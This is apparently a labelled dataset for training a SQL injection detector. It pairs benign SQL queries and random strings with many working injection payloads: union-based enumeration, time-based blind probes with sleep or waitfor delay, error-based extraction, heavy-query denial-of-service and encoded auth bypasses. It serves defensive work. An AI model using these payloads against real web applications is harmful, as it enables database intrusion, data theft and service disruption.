Query,Label
"select * from users where id = '1' union select ""?""_,version ( ) -- 1'",1
"1"" where 2204 = 2204 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1
SELECT chart FROM declared UNION SELECT indeed FROM concerned ORDER BY were,0
-4901 ) or 3407 = 6442#,1
"SELECT byID AS ID, alphabet AS cover FROM jet",0
vir7eino,0
48289,0
2595,0
SELECT spell ( s ) FROM else INNER JOIN,0
SELECT * FROM parallel FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM upper,0
SELECT * FROM ( SELECT ancient FROM determine ),0
SELECT * FROM soap FETCH FIRST 50 PERCENT ROWS ONLY,0
"carrera 55,",0
depp@rpdkorea.il,0
"select * from users where id = 1 or ""_;"" or 1 = 1 -- 1",1
SELECT AVG ( student ) FROM cabin SELECT SUM ( led ),0
"SELECT Employees.means, COUNT ( Orders.actuallyID ) AS hurryFROM ( OrdersINNER JOIN effort ON Orders.appliedID = Employees.tankID )",0
1' in boolean mode ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) #,1
select * from users where id = '1' *$ . or 1 = 1 -- 1',1
"select * from users where id = 1 <@. union select version ( ) ,version ( ) -- 1",1
"mesas, las",0
"1' where 9420 = 9420 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
"-4194"" ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""ddbc"" like ""ddbc",1
( select top 1,1
"-8633"" or 5099 = 5974",1
SELECT * FROM honor FETCH FIRST 3 ROWS ONLY,0
"1' ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( 'llfp' = 'llfp",1
5.88977E+15,0
theo,0
"SELECT Orders.breadrID, Employees.mountain, Employees.compass FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.societyID ORDER BY Orders.vaporID",0
"1' ) as najc where 5213 = 5213 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",1
vilca llora,0
digenova,0
pineda de la sierra,0
perfeccin,0
palmer manzano,0
"SELECT creature AS mighty, adult AS [serious] FROM hair",0
SELECT spent ( s ) FROM chief SELECT long FROM sum,0
"-5672' ) ) union all select 9371,9371,9371,9371,9371,9371--",1
SELECT * FROM star WHERE NOT own = 'structure' AND NOT now = 'fair',0
ordinar,0
eby@miplat.nl,0
SELECT citizen ( s ) FROM news SELECT distant FROM hall,0
-6433%' ) ) or 9323 = 9323#,1
maid,0
99eja36r9a,0
"UPDATE alike SET think = 'gather', City = 'oil' WHERE expect = sit",0
d75a4r45der,0
"SELECT Employees.bound, COUNT ( Orders.thirdID ) AS mineralsFROM ( OrdersINNER JOIN off ON Orders.theeID = Employees.minuteID )",0
SELECT * FROM else WHERE entirely = 'tonight' LIMIT 3,0
SELECT * FROM ( SELECT shallow FROM drive ),0
79564193v,0
gibert mallorqun,0
SELECT * FROM what,0
mera alccer,0
"select pg_sleep ( 5 ) and ""zhsc"" = ""zhsc",1
"-2434 ) union all select 8310,8310,8310,8310,8310--",1
SELECT expression FROM organized,0
"1"" where 2403 = 2403 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
-7775 or 8571 = 8571--,1
22311,0
SELECT TOP 3 * FROM complex,0
hews,0
"1 ) ) as qgok where 3993 = 3993 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",1
declare @q nvarchar ( 200 ) 0x730065006c00650063 ...,1
SELECT * FROM settlers WHERE decide LIKE '%trace%',0
"-7744"" ) ) ) union all select 9408,9408,9408,9408--",1
"-3215"" ) union all select 4457,4457,4457,4457,4457#",1
-3666' ) where 6386 = 6386 union all select 6386--,1
"1"" ) where 2445 = 2445",1
"SELECT until,tube,blow FROM stopped LEFT JOIN Orders ON engine.silenceID = everything.change ORDER BY metal.universe",0
"select * from users where id = 1 or "". ) "" or 1 = 1 -- 1",1
larreynaga arce,0
08466616v,0
SELECT * FROM press WHERE break = 'map' FETCH FIRST 3 ROWS ONLY,0
-5547' or 9323 = 9323#,1
SELECT * FROM lunch WHERE him = joy,0
"SELECT can, instead, term FROM official WHERE map IS NULL",0
"INSERT INTO population ( missing, therefore, particularly, other, herself, yes ) VALUES ( 'product', 'shop'. time', 'active', 'active', 'open', 'before' )",0
"1%' ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( '%' = '",1
32806661j,0
44338,0
3xp2n18va,0
2.82E+15,0
SELECT * FROM chamber WHERE discovery = 'short' LIMIT 3,0
1' ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ),1
34475,0
2161o1o,0
SELECT jump,0
admin%27%20OR%201%3D1--,1
"-1597"" union all select 6038,6038,6038,6038,6038,6038,6038,6038,6038,6038--",1
stapley@cirugiaplasticacordoba.jm,0
"-9958"" ) as jzvq where 3741 = 3741 union all select 3741,3741,3741#",1
"1"" ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""giuq"" = ""giuq",1
"1234 ' AND 1 = 0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",1
"SELECT column_name ( s ) FROM pleasant,farm",0
"1"" ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
"SELECT blind,walk,exciting FROM fastened LEFT JOIN Orders ON heard.sawID = day.period ORDER BY studied.solid",0
"SELECT * FROM Users WHERE Name = """" or """" = """" AND Pass = """" or """" = """"",0
1'+ ( select qdon where 9453 = 9453,1
SELECT * FROM hair FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM drew,0
"1"" ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( ""ruvo"" like ""ruvo",1
protoalbitar,0
acre,0
SELECT COUNT ( leather ) FROM play,0
"1"" ) ) as fmul where 7827 = 7827",1
1 where 9932 = 9932,1
SELECT least ( s ) FROM again INNER JOIN,0
SELECT wp_posts.* FROM wp_posts WHERE ID IN ( 367581 ),0
bly7,0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( 7240 = 7240",1
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'gsup' = 'gsup",1
SELECT * FROM roof FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM apart,0
42093532j,0
SELECT * FROM instead ORDER BY atmosphere DESC,0
"-5904"" where 9782 = 9782 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",1
1' where 4460 = 4460,1
"1"" ) as nixg where 4580 = 4580 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1
SELECT * FROM port WHERE goes NOT BETWEEN 'some' AND 'underline',0
"1"" and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ""okpa"" = ""okpa",1
"1"" where 5334 = 5334 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1
"-9959"" ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""vcwc"" = ""vcwc",1
SELECT MIN ( hot ) AS sum FROM shoe,0
"' AND (SELECT SUBSTRING(version(),1,1))='P' --",1
"select * from users where id = 1 union select 1a,banner from v$version where rownum = 1 -- 1",1
""" or """"*""",1
"1'|| ( select 'gtri' from dual where 7097 = 7097 and elt ( 1210 = 1210,sleep ( 5 ) ) ) ||'",1
UPDATE single SET view = 'at'WHERE huge = 'made',0
39515,0
SELECT Count ( * ) AS instant,0
"1 ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 4666 = 4666",1
"select pg_sleep ( 5 ) and ( ( ( ""%"" = """,1
SELECT MIN ( age ) AS basic FROM because,0
25182,0
select ( case when ( 1354 = 7529 ) then 1354 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1
SELECT * FROM solve WHERE habit = 'situation',0
"1"" ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""ctzh"" = ""ctzh",1
"select * from generate_series ( 6414,6414,case when ( 6414 = 6455 ) then 1 else 0 end ) limit 1--",1
6ar10l30,0
"SELECT t.*, tt.*, tr.object_id FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id INNER JOIN wp_term_relationships AS tr ON tr.term_taxonomy_id = tt.term_taxonomy_id WHERE tt.taxonomy IN ( 'agent_category', 'agent_city' ) AND tr.object_id IN ( 28313, 28341 ) ORDER BY t.name ASC",0
UPDATE name SET opinion = 'pride'WHERE bank = 'meant',0
1 ) where 2940 = 2940,1
"SELECT gave AS add, welcome AS [river] FROM officer",0
"1 ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( 9542 = 9542",1
SELECT * FROM struggle WHERE tea = forest,0
select sleep ( 5 ) and 'beuk' = 'beuk,1
brana,0
"1' ) and make_set ( 8403 = 8403,8899 )",1
"1 ) ) as jyfo where 8121 = 8121 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
"avinguda gabriel alomar i villalonga, 20 6?a",0
-2793' ) where 2621 = 2621 union all select 2621#,1
tolox,0
SELECT sudden FROM cause UNION SELECT hospital FROM straw ORDER BY pleasure,0
SELECT * FROM famous WHERE enter NOT LIKE '[song]%',0
"-4695' ) ) ) union all select 5844,5844,5844,5844,5844,5844#",1
SELECT * FROM open WHERE throughout = 'fought' AND City = 'me',0
SELECT * FROM tool WHERE NOT globe = 'key' AND NOT queen = 'bottom',0
1%' ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( '%' = ',1
"-3546%"" or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""%"" = """,1
1' ) rlike ( select ( case when ( 7447 = 3981 ) then 1 else 0x28 end ) ),1
SELECT length FROM funny,0
"1"" ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""mzhk"" = ""mzhk",1
"1"" where 4213 = 4213 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
SELECT TOP 3 * FROM ought WHERE brain = 'birthday' SELECT * FROM major,0
"INSERT INTO solution ( swung, pencil, cup, welcome, those, unhappy ) VALUES ( 'impossible', 'pen'. title', 'weak', 'front', 'judge', 'sets' )",0
"-8013%"" or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""%"" = """,1
"SELECT COUNT ( principle ) , office FROM idea BY biggest",0
"1"" ) ) as ylah where 9248 = 9248",1
SELECT AVG ( party ) FROM apart SELECT SUM ( dish ),0
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) -- sztf",1
pesquisar,0
"1%"" ) ) and make_set ( 9897 = 5557,5557 ) and ( ( ""%"" = """,1
"1' where 5004 = 5004 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
SELECT * FROM dollar WHERE political BETWEEN '1996-07-01' AND '1996-07-31',0
43713,0
"-4385%' ) ) union all select 6694,6694,6694,6694,6694,6694,6694,6694,6694,6694#",1
"1"" ) as tecq where 4817 = 4817 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
select sleep ( 5 ) and 'hhrw' like 'hhrw,1
SELECT * FROM story WHERE table BETWEEN '1996-07-01' AND '1996-07-31',0
"c/ nueva fuera, 139 3?g",0
test'--,1
%2527%2520UNION%2520SELECT%25201%252C2%252C3%2520--,1
-8922 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) -- krmh,1
81451206h,0
ve4t4nal,0
SELECT within ( s ) FROM map UNION ALL,0
SELECT * FROM or WHERE may = 'box' LIMIT 3,0
"-4932%"" ) ) or ( 3076 = 5927 ) *5927 and ( ( ""%"" = """,1
SELECT TOP 50 PERCENT * FROM couple SELECT * FROM use FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM instance,0
SELECT sat FROM pink UNION ALL SELECT brother FROM little ORDER BY wore,0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_parent = 27990 AND ( wp_posts.post_mime_type LIKE 'image/%' ) AND wp_posts.post_type = 'attachment' AND ( ( wp_posts.post_status = 'inherit' ) ) ORDER BY wp_posts.menu_order ASC LIMIT 0, 1",0
"select * from users where id = '1' union select \,@@VERSION -- 1'",1
"1"" ) as tnux where 4888 = 4888 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",1
langlois_benavente@sutelefono.mg,0
"1' ) ) and make_set ( 3793 = 8118,8118 ) and ( ( 'swvc' like 'swvc",1
"minguez, 98",0
"1'+ ( select bptu where 7356 = 7356 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) ) +'",1
-1485' ) or ( 2056 = 4008 ) *4008 and ( 'vphj' = 'vphj,1
28782647x,0
"1"" waitfor delay '0:0:5'--",1
thirugna,0
1%' ) or sleep ( 5 ) #,1
"-1339 ) ) ) union all select 2938,2938,2938,2938,2938,2938#",1
"1 where 7757 = 7757 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --",1
manducatoria,0
1' ) as irnj where 7274 = 7274 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,1
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'ekhi' = 'ekhi",1
SELECT * FROM seldom WHERE NOT union = 'drove' AND NOT window = 'liquid',0
-4108' ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 'tqjx' = 'tqjx,1
-9564 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ),1
"1%"" ) ) and sleep ( 5 ) #",1
"1 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",1
1'|| ( select 'npdx' from dual where 9486 = 9486 and sleep ( 5 ) ) ||',1
"-1370' ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( 'xmrg' = 'xmrg",1
"SELECT * FROM triangle WHERE bare BETWEEN ""laugh"" AND ""black""",0
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( 'frpo' like 'frpo",1
"1' ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( 'raus' = 'raus",1
"1' ) ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ( 'yqhk' = 'yqhk",1
"-9944"" ) ) or 8537 = 2039 and ( ( ""kfzj"" = ""kfzj",1
SELECT thick ( s ) FROM pleasant INNER JOIN,0
"1%' ) union all select null,null--",1
zulmara,0
"altos de lillo, 137",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 8774 ) ORDER BY meta_id ASC",0
SELECT DISTINCT claws FROM gentle,0
1 ) where 3936 = 3936,1
"1'|| ( select 'jonh' from dual where 2415 = 2415 union all select null,null,null,null,null,null,null,null,null--",1
SELECT * FROM clothes WHERE proud = 'third' AND ( knowledge = 'thread' OR recognize = 'rocket' ),0
"1' ) union all select null,null,null,null,null--",1
"select count ( * ) from generate_series ( 1,5000000 ) #",1
dido,0
le8ru41,0
1%' ) ) ) and sleep ( 5 ) #,1
bollullos par del condado,0
encad7622i6,0
"1"" and sleep ( 5 )",1
"SELECT tall, desert, market FROM soap WHERE depth IS NULL",0
SELECT *INTO CustomersGermany FROM Customers WHERE Country = 'Germany';,0
"select sleep ( 5 ) and ( ""tlbj"" like ""tlbj",1
DELETE FROM former,0
"-6130 union all select 3211,3211,3211,3211,3211,3211,3211,3211,3211#",1
3.99279E+14,0
SELECT MIN ( flat ) AS lower FROM railroad,0
waitfor delay '0:0:5' and ( ( 7619 = 7619,1
0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A,1
SELECT * FROM thy,0
SELECT Count ( * ) AS sail,0
"1' ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( 'adnz' = 'adnz",1
SELECT * FROM balance WHERE design = 'easier',0
"-3445 union all select 5505,5505,5505--",1
7447,0
SELECT knew FROM basket UNION ALL SELECT impossible FROM heading ORDER BY announced,0
SELECT * FROM main ORDER BY nearby,0
"1%' ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( '%' = '",1
1'+ ( select 'czpg' where 6627 = 6627 and 2006 = 2006,1
